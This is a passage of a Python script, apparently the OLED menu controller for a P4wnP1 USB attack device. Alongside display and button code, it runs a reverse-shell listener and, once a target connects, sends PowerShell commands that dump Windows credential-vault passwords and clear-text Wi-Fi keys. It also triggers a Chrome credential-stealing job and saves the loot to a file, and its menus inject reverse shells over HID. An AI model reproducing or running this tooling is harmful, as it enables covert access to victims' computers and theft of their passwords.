                    draw.text((105, line5-7), "20",  font=font, fill=255)                    
            else: # button is pressed:
                    draw.ellipse((100,20,120,40), outline=255, fill=1) #B button filled
                    shell("P4wnP1_cli trigger send -n \"oled\" -v 20")
                    
            if GPIO.input(KEY3_PIN): # button is released
                    draw.ellipse((70,40,90,60), outline=255, fill=0) #A button
                    draw.text((75, line7-5), "30",  font=font, fill=255)                    
            else: # button is pressed:
                    draw.ellipse((70,40,90,60), outline=255, fill=1) #A button filled
                    shell("P4wnP1_cli trigger send -n \"oled\" -v 30")
            draw.text((25, line4+2), "Go",  font=font, fill=255)
            #time.sleep(0.1)
def Osdetection():
    DisplayText(
            "",
            "",
            "",
            "      PLEASE WAIT",
            "",
            "",
            ""
            )
    os=IdentOS("172.16.0.2")
    detail=OsDetails("172.16.0.2")
    while GPIO.input(KEY_LEFT_PIN):
        DisplayText(
            "Experimental nmap OS",
            "detection",
            "",
            os.replace("Microsoft","MS").replace("Windows","win"),
            detail.replace("Microsoft","MS").replace("Windows","win"),            
            "",
            "Press LEFT to exit"
            )
    
def socketCreate():
    try:
        global host
        global port
        global s
        port = 4445
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        if port == '':
            socketCreate()
        #socketCreate()
    except socket.error as msg:
        print('socket creation error: ' + str(msg[0]))
def socketBind():
    try:
        print('Binding socket at port %s'%(port))
        s.bind((host,port))
        s.listen(1)
    except socket.error as msg:
        print('socket bindig error: ' + str(msg[0]))
        print('Retring...')
        socketBind()
def socketAccept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print('[!] Session opened at %s:%s'%(addr[0],addr[1]))
        menu2()
    except socket.error as msg:
        print('Socket Accepting error: ' + str(msg[0]))
def sendps1(ps1file):        
        f=open(ps1file,"r")
        for x in f:
            conn.send(x.encode())
            result = conn.recv(16834)
            print(result.decode())
def menu2():
    DisplayText(
            "",
            "",
            "",
            "      PLEASE WAIT",
            "",
            "",
            ""
            )    
    shell("P4wnP1_cli hid job 'GetChrome.js'")
    hack = ""
    command = "Test-Connection -computer \"google.com\" -count 1 -quiet"
    conn.send(command.encode())
    result = conn.recv(16834)
    if result.decode()[:-6]=="T":
        print("Internet is on, on host")    
    conn.send("hostname".encode())
    result = conn.recv(16834)
    print(result.decode().replace("\r\n","")[:-1])
    hostname = result.decode().replace("\r\n","")[:-1]
    command = "[System.IO.DriveInfo]::getdrives() |where-object {$_.VolumeLabel -match \"USBKEY\"}|sort {$_.name} |foreach-object {; echo \"$(echo $_.name)\";}"
    conn.send(command.encode())
    result = conn.recv(16834)
    usbkey = result.decode().replace("\r\n","")[:-1]
    print("Usb key detected in : [" +usbkey+"]")
    hack = hostname + "\n"
    hack = hack + "Passwords windows :\n"
    command="$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$VaultObj = new-object Windows.Security.Credentials.PasswordVault;"
    conn.send(command.encode())
    result = conn.recv(16834)
    print(result.decode())
    command = "$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }"
    conn.send(command.encode())
    result = conn.recv(16834)
    hack = hack + result.decode()
    print(result.decode())
    DisplayText(
            "",
            "",
            "GETTING MS EXPLORER",
            "      PASSWORDS",
            "",
            "",
            ""
            )    
    command = "$SSID=((netsh wlan show profiles) -match 'Profil Tous les utilisateurs[^:]+:.(.+)$').replace(\"Profil Tous les utilisateurs\",\"\").replace(\":\",\"\").replace(\" \",\"\").split(\"\\n\");$fin=\"\";"
    conn.send(command.encode())
    result = conn.recv(16834)
    print(result.decode())
    command = "for ($n=0;$n -le $SSID.count-1;$n++){try {;$fin = $fin + $SSID[$n]+((netsh wlan show profiles $SSID[$n].Substring($SSID[$n].Length -($SSID[$n].Length -1)) key=clear) -match 'Contenu de la c[^:]+:.(.+)$').split(\":\")[1];} catch {};};$fin"
    conn.send(command.encode())
    time.sleep(2)
    result = conn.recv(16834)
    print(result.decode())
    hack = hack + "Wifi : \n" + result.decode()
    DisplayText(
            "",
            "",
            "GET STORED WIFI SSID",
            "      PASSWORDS",
            "",
            "",
            ""
            )
    time.sleep(2)
    DisplayText(
            "",
            "",
            "GET GOOGLE CHROME",
            "      PASSWORDS",
            "",
            "",
            ""
            )
    time.sleep(2)
    print('end')
    #done , let save this on disk
    f=open("/root/" + hostname+".txt","w+")
    f.write(hack)
    f.close()
    print(hostname+".txt saved, host is pwned")
    while 1:
        #cmd = raw_input('PS >')
        cmd ='quit'
        if cmd == 'quit':
            conn.close()
            s.close()
            while GPIO.input(KEY_LEFT_PIN):
                    DisplayText(
                    "DONE HOST PWNED FIND",
                    "ALL INFOS IN FILE",
                    "/root/"+hostname+".txt",
                    "CHOME CREDS are in",
                    usbkey+hostname+"chrome.txt",
                    "",
                    "Press LEFT to Exit"
                    )
            return
            #sys.exit()
        command = conn.send(cmd)
        result = conn.recv(16834)
        print(result)
def main():
    socketCreate()
    socketBind()
    socketAccept()
#init vars 
curseur = 1
page=0  
menu = 1
ligne = ["","","","","","","",""]
selection = 0
if SCNTYPE == 1:
    splash()  # display boot splash image ---------------------------------------------------------------------
    #print("selected : " + FileSelect(hidpath,".js"))
    device.contrast(2)
while 1:
    if GPIO.input(KEY_UP_PIN): # button is released
        menu = 1
    else: # button is pressed:
        curseur = curseur -1
        if curseur<1:
            curseur = 7     
    if GPIO.input(KEY_LEFT_PIN): # button is released
        menu = 1
    else: # button is pressed:
                # back to main menu on Page 0
        page = 0    
    if GPIO.input(KEY_RIGHT_PIN): # button is released
        menu = 1
    else: # button is pressed:
        selection = 1
    if GPIO.input(KEY_DOWN_PIN): # button is released
        menu = 1
    else: # button is pressed:
        curseur = curseur + 1
        if curseur>7:
            curseur = 1
    #-----------
    if selection == 1:
        # une option du menu a ete validee on va calculer la page correspondante
            if page == 7:
                #system menu
                if curseur == 1:
                    sysinfos()
                if curseur == 2:
                    brightness = OLEDContrast(brightness)
                if curseur == 3:
                    #os detection
                    Osdetection()
                if curseur == 4:
                    SreenOFF()
                if curseur == 5:
                    KeyTest()
                if curseur == 6:
                    restart()
                if curseur == 7:
                    exit()
            if page == 14:
                #HID related menu
                if curseur == 1:
                    #run hid script
                    runhid()
                if curseur == 2:
                    #gamepad
                    Gamepad()
                if curseur == 3:
                    #mouse
                    Mouse()
                if curseur == 4:
                    #Set typing speed
                    SetTypingSpeed()
            if page == 21:
                if curseur == 1:
                    #SSID LIST
                    scanwifi()
            if page == 28:
                    #trigger section
                if curseur == 1:
                    trigger1()
            if page == 35:
                #template section menu
                if curseur == 1:
                    #FULL_SETTINGS
                    template = templateSelect("FULL_SETTINGS")
                    if template!="":
                        ApplyTemplate(template,"f")
                if curseur == 2:
                    #BLUETOOTH
                    template = templateSelect("BLUETOOTH")
                    if template!="":
                        ApplyTemplate(template,"b")
                if curseur == 3:
                    #USB
                    template = templateSelect("USB")
                    print(template)
                    if template!="":
                        ApplyTemplate(template,"u")
                if curseur == 4:
                    #WIFI
                    template = templateSelect("WIFI")
                    if template!="":
                        ApplyTemplate(template,"w")
                if curseur == 5:
                    #TRIGGER_ACTIONS
                    template = templateSelect("TRIGGER_ACTIONS")
                    if template!="":
                        ApplyTemplate(template,"t")
                if curseur == 6:
                    #NETWORK
                    template = templateSelect("NETWORK")
                    if template!="":
                        ApplyTemplate(template,"n")
            if page == 42:
                #infosec commands
                if curseur == 1:
                    # reverseshell injection
                    answer = 0
                    while answer == 0:
                        DisplayText(
                            "                 YES",
                            "",
                            "INJECT REVERSESHELL",
                            "TO CONNECTED HOST",
                            "ARE YOU SURE ?",
                            "",
                            "                  NO"
                            )
                        if GPIO.input(KEY1_PIN): # button is released
                            menu = 1
                        else: # button is pressed:
                            answer = 1
                        if GPIO.input(KEY3_PIN): # button is released
                            menu = 1
                        else: # button is pressed:
                            answer = 2
                    if answer == 1:
                        shell("P4wnP1_cli hid job 'gui inject revshell.js'")
                if curseur == 3:
                    # reverseshell exploitation
                    answer = 0
                    while answer == 0:
                        DisplayText(
                            "                 YES",
                            "",
                            "EXPLOIT REVERSESHELL",
                            " ON CONNECTED HOST",
                            "  ARE YOU SURE ?",
                            "",
                            "                  NO"
                            )
                        if GPIO.input(KEY1_PIN): # button is released
                            menu = 1
                        else: # button is pressed:
                            answer = 1
                        if GPIO.input(KEY3_PIN): # button is released
                            menu = 1
                        else: # button is pressed:
                            answer = 2
                    if answer == 1:
                        main()
                if curseur == 2:
                    # reverseshell injection user
                    answer = 0
                    while answer == 0:
                        DisplayText(
                            "                 YES",
                            "",
                            "INJECT REVERSESHELL",
                            "TO CONNECTED HOST",
                            "ARE YOU SURE ?",
                            "",
                            "                  NO"
                            )
                        if GPIO.input(KEY1_PIN): # button is released
                            menu = 1
                        else: # button is pressed:
                            answer = 1
                        if GPIO.input(KEY3_PIN): # button is released
                            menu = 1
                        else: # button is pressed:
                            answer = 2
                    if answer == 1:
                        shell("P4wnP1_cli hid job 'gui inject revshell user.js'")                    
            if page == 0:
            #we are in main menu
                if curseur == 1:
                    # call about
                    about()
                if curseur == 2:
                    #system menu 
                    page = 7
                    curseur = 1
                if curseur == 3:
                #hid attacks menu
                    page = 14
                    curseur = 1
                if curseur == 4:
                    page = 21
                    curseur = 1
                if curseur == 5:
                    page = 28
                    curseur = 1
                if curseur == 6:
                    page = 35
                    curseur = 1
                if curseur == 7:
                    page = 42
                    curseur = 1
                print(page+curseur)
    ligne[1]=switch_menu(page)
    ligne[2]=switch_menu(page+1)
    ligne[3]=switch_menu(page+2)
    ligne[4]=switch_menu(page+3)
    ligne[5]=switch_menu(page+4)
    ligne[6]=switch_menu(page+5)
    ligne[7]=switch_menu(page+6)
    #add curser on front on current selected line
    for n in range(1,8):
        if page+curseur == page+n:
            if page == 1:
                if readCapacity(bus) < 16:
                    ligne[n] = ligne[n].replace("_","!")
                else:
                    ligne[n] = ligne[n].replace("_",">")
            else:
                ligne[n] = ligne[n].replace("_",">")
        else:
            ligne[n] = ligne[n].replace("_"," ")
    DisplayText(ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6],ligne[7])
    #print(page+curseur) #debug trace menu value
    time.sleep(0.1)
    selection = 0
GPIO.cleanup()
